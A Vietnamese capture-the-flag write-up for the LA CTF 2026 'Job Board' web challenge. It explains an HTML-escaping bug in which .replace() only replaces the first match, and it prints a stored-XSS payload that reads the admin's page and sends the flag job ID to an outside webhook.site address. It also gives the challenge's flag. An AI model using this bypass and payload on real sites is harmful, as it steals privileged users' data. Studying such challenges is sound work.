---
layout: single
title: "[Writeup] LA CTF 2026 - Job Board (Web)"
date: 2026-02-10
classes: wide
categories: [LACTF-2026, web]
tags: [lactf, web, xss, stored-xss, filter-bypass, xs-leak]
---

Chào bạn, đây là bản Writeup chi tiết, chuyên nghiệp và dễ hiểu dành cho thử thách **Job Board** tại LA CTF. Bản này được thiết kế để giúp bạn không chỉ trình bày cách giải mà còn giải thích được "tại sao" nó lại hoạt động.

## 📋 Thông tin thử thách

*   **Tên thử thách:** Job Board
*   **Thể loại:** Web Exploitation
*   **Đặc điểm:** Stored XSS, Filter Bypass, XS-Leaks.
*   **Flag:** `lactf{c0ngr4ts_0n_y0ur_n3w_l7fe}`

## 🔍 1. Phân tích bài toán (Recon)

Thử thách cung cấp một hệ thống tìm việc làm đơn giản. Qua việc đọc mã nguồn cung cấp, chúng ta xác định được các thành phần quan trọng:

### Cơ chế hiển thị Flag

*   Trong `app.js`, flag được lưu trong phần mô tả của một công việc "nội bộ" có tên là **Flag Haver**.
*   Người dùng bình thường chỉ thấy danh sách `publicJobs`.
*   Khi **Admin (Recruiter)** đăng nhập, trang chủ (`/`) sẽ hiển thị thêm danh sách `privateJobs`, trong đó có ID dẫn đến trang chứa Flag.

### Hành vi của Admin Bot

File `admin-bot.js` mô tả quy trình làm việc của người thẩm định:
1.  Đăng nhập vào hệ thống với tư cách admin.
2.  Truy cập vào một đường dẫn (URL) bất kỳ mà người chơi cung cấp.
3.  Dừng lại 5 giây để trang tải xong rồi đóng trình duyệt.

**Ý tưởng:** Chúng ta cần lừa Admin truy cập vào một trang có chứa mã độc để rò rỉ (leak) ID của công việc chứa Flag từ trang chủ của Admin về máy chủ của mình.

![Admin Bot Interface](/assets/images/lactf/job-board/admin-bot.png)

## 🛡️ 2. Xác định lỗ hổng (Vulnerability)

Lỗ hổng cốt lõi nằm ở hàm lọc dữ liệu đầu vào `htmlEscape` trong `app.js`:

```javascript
function htmlEscape(s, quote=true) {
  s = s.replace("&", "&amp;"); 
  s = s.replace("<", "&lt;");
  s = s.replace(">", "&gt;");
  // ...
}
```

### Lỗi logic: `.replace()` vs `.replaceAll()`

Trong JavaScript, hàm `string.replace("A", "B")` chỉ thay thế **lần xuất hiện đầu tiên** của ký tự "A".

*   Nếu đầu vào là `<script>`, nó sẽ bị biến thành `&lt;script>`. (An toàn)
*   Nhưng nếu đầu vào là `<<script>`, nó sẽ biến thành `&lt;<script>`. (Ký tự `<` thứ hai vẫn tồn tại!).

Đây chính là kỹ thuật **Filter Bypass** giúp chúng ta thực hiện cuộc tấn công **Stored XSS** (Cross-Site Scripting lưu trữ) vào phần mô tả ứng tuyển của mình.

## 🚀 3. Quá trình khai thác (Exploitation)

Để lấy được Flag, chúng ta phải xây dựng một mã độc (Payload) có thể chạy trên trình duyệt của Admin và né được các bộ lọc còn lại.

### Thử thách 1: Né tránh các thực thể HTML

Hàm `htmlEscape` còn lọc cả dấu nháy đơn `'` thành `&#x27;` và dấu `&` thành `&amp;`.

*   **Giải pháp:** Sử dụng dấu huyền (backtick) `` ` `` thay cho dấu nháy đơn vì nó không bị lọc.
*   **Giải pháp:** Sử dụng các câu lệnh `if` lồng nhau thay vì toán tử `&&` để tránh ký tự `&`.

### Thử thách 2: Lấy đúng ID Flag

Trên trang chủ của Admin có nhiều công việc. Flag thường nằm ở công việc cuối cùng trong danh sách. Chúng ta sử dụng Regex để quét tất cả các UUID và chọn phần tử cuối cùng.

### Payload cuối cùng

Chúng ta dán đoạn mã này vào ô "Why/Bio/Resume" khi nộp đơn ứng tuyển:

```html
''<><script>
  fetch(`/`) // Truy cập trang chủ của Admin
    .then(r => r.text())
    .then(t => {
      // Tìm tất cả các UUID của job dạng /job/[UUID]
      const matches = t.match(/\/job\/[a-f0-9-]{36}/g);
      if (matches) {
        if (matches.length > 0) {
          // Lấy ID của Flag Haver (nằm cuối danh sách)
          const flagJobPath = matches[matches.length - 1];
          const flagId = flagJobPath.split(`/`)[2];
          // Gửi ID đó về Webhook cá nhân
          fetch(`https://webhook.site/YOUR_ID?real_id=${flagId}`);
        }
      }
    });
</script>
```

## 🏁 4. Các bước thực hiện (Step-by-step)

1.  **Tạo Payload:** Sử dụng đoạn mã trên, thay `YOUR_ID` bằng địa chỉ Webhook.site của bạn.
2.  **Nộp đơn:** Điền tên, email và dán Payload vào ô "Why", sau đó nhấn **Apply!**.
3.  **Lấy Link:** Copy URL trang ứng tuyển vừa tạo (ví dụ: `https://job-board.chall.lac.tf/application/xyz...`).
4.  **Gửi cho Admin:** Sử dụng công cụ Admin Bot được giải đấu cung cấp, dán URL vào và nhấn **Submit**.
5.  **Nhận ID:** Kiểm tra Webhook.site để nhận mã `real_id` (ví dụ: `efa7df93-...`).

    ![Webhook Request](/assets/images/lactf/job-board/webhook.png)

6.  **Lấy Flag:** Truy cập `https://job-board.chall.lac.tf/job/[MÃ_ID_NHẬN_ĐƯỢC]`.

    ![Flag Page](/assets/images/lactf/job-board/flag.png)

## 📝 5. Kết luận

Thử thách Job Board minh họa tầm quan trọng của việc sử dụng các hàm thay thế chuỗi một cách triệt để (`replaceAll` hoặc Regex toàn cục). Chỉ một sai sót nhỏ trong việc lọc dữ liệu cũng có thể dẫn đến việc rò rỉ thông tin nhạy cảm của người dùng có quyền hạn cao thông qua các cuộc tấn công Side-channel.
